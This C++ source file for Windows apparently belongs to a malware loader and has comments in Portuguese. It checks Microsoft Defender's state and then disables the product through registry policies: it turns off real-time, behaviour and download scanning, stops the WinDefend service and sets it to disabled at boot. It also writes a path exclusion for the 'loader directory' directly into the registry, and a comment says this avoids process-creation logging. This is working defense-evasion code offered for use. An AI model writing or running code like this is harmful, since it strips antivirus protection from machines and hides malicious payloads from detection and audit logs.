#include "defense.h"
#include <cstdio>

namespace {

constexpr const wchar_t* kDefKey =
    L"SOFTWARE\\Microsoft\\Windows Defender";
constexpr const wchar_t* kPolKey =
    L"SOFTWARE\\Policies\\Microsoft\\Windows Defender";

bool ReadDword(HKEY root, const wchar_t* sub, const wchar_t* name, DWORD& out)
{
    HKEY h = nullptr;
    if (RegOpenKeyExW(root, sub, 0, KEY_READ | KEY_WOW64_64KEY, &h) != ERROR_SUCCESS)
        return false;
    DWORD type = 0, sz = sizeof(DWORD), val = 0;
    LONG r = RegQueryValueExW(h, name, nullptr, &type,
                              reinterpret_cast<LPBYTE>(&val), &sz);
    RegCloseKey(h);
    if (r != ERROR_SUCCESS || type != REG_DWORD) return false;
    out = val;
    return true;
}

bool WriteDword(HKEY root, const wchar_t* sub, const wchar_t* name, DWORD val)
{
    HKEY h = nullptr;
    DWORD disp = 0;
    LONG r = RegCreateKeyExW(root, sub, 0, nullptr, 0,
                             KEY_WRITE | KEY_WOW64_64KEY, nullptr, &h, &disp);
    if (r != ERROR_SUCCESS) return false;
    r = RegSetValueExW(h, name, 0, REG_DWORD,
                       reinterpret_cast<const BYTE*>(&val), sizeof(val));
    RegCloseKey(h);
    return r == ERROR_SUCCESS;
}

void Report(const char* what, bool ok)
{
    printf("    [%s] %s\n", ok ? "ok" : "fail", what);
}

} // namespace

DefState QueryDefender()
{
    DefState s{};

    HANDLE tok = nullptr;
    TOKEN_ELEVATION el{};
    DWORD len = 0;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
        if (GetTokenInformation(tok, TokenElevation, &el, sizeof(el), &len))
            s.elevated = el.TokenIsElevated != 0;
        CloseHandle(tok);
    }

    // TamperProtection: 5 = ligado, 4/0 = desligado. Ausente = nunca configurado.
    DWORD tp = 0;
    if (ReadDword(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows Defender\\Features",
                  L"TamperProtection", tp)) {
        // Observado no 24H2 (Eval): 1 = ligado, 4 = desligado, 5 = ligado,
        // 0 = nunca configurado. Qualquer valor fora de {0,4} conta como ligado.
        s.tamper = (tp != 0 && tp != 4) ? 1 : 0;
    }

    DWORD rtp = 0;
    if (ReadDword(HKEY_LOCAL_MACHINE,
                  L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection",
                  L"DisableRealtimeMonitoring", rtp))
        s.rtOff = (rtp == 1);

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"WinDefend", SERVICE_QUERY_STATUS);
        if (svc) {
            SERVICE_STATUS st{};
            if (QueryServiceStatus(svc, &st))
                s.serviceRunning = (st.dwCurrentState == SERVICE_RUNNING);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    return s;
}

void ApplyDefenderTamper(const std::wstring& excludeDir)
{
    // 1) Politicas de grupo locais (efetivas so' com Tamper Protection off).
    Report("policy DisableAntiSpyware=1",
           WriteDword(HKEY_LOCAL_MACHINE, kPolKey, L"DisableAntiSpyware", 1));

    const std::wstring rtPol = std::wstring(kPolKey) + L"\\Real-Time Protection";
    Report("policy DisableRealtimeMonitoring=1",
           WriteDword(HKEY_LOCAL_MACHINE, rtPol.c_str(),
                      L"DisableRealtimeMonitoring", 1));
    Report("policy DisableBehaviorMonitoring=1",
           WriteDword(HKEY_LOCAL_MACHINE, rtPol.c_str(),
                      L"DisableBehaviorMonitoring", 1));
    Report("policy DisableIOAVProtection=1",
           WriteDword(HKEY_LOCAL_MACHINE, rtPol.c_str(),
                      L"DisableIOAVProtection", 1));

    // 2) Exclusao direta no registry (evita 4688 de PowerShell/WMI).
    //    Recomendado: excluir o diretorio do loader antes de qualquer execucao.
    const std::wstring exRoot = std::wstring(kDefKey) + L"\\Exclusions\\Paths";
    Report("exclusion: loader directory",
           WriteDword(HKEY_LOCAL_MACHINE, exRoot.c_str(), excludeDir.c_str(), 0));

    // 3) Parar o servico (falha com TP).
    bool stopped = false;
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm) {
        SC_HANDLE svc = OpenServiceW(scm, L"WinDefend",
                                     SERVICE_STOP | SERVICE_QUERY_STATUS);
        if (svc) {
            SERVICE_STATUS st{};
            stopped = ControlService(svc, SERVICE_CONTROL_STOP, &st) != 0;
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }
    Report("ControlService(WinDefend, STOP)", stopped);

    // 4) Marcar start=disabled para o proximo boot.
    bool dis = false;
    SC_HANDLE scm2 = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (scm2) {
        SC_HANDLE svc = OpenServiceW(scm2, L"WinDefend", SERVICE_CHANGE_CONFIG);
        if (svc) {
            dis = ChangeServiceConfigW(svc, SERVICE_NO_CHANGE,
                                       SERVICE_DISABLED, SERVICE_NO_CHANGE,
                                       nullptr, nullptr, nullptr, nullptr,
                                       nullptr, nullptr, nullptr) != 0;
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm2);
    }
    Report("WinDefend start=disabled", dis);
}
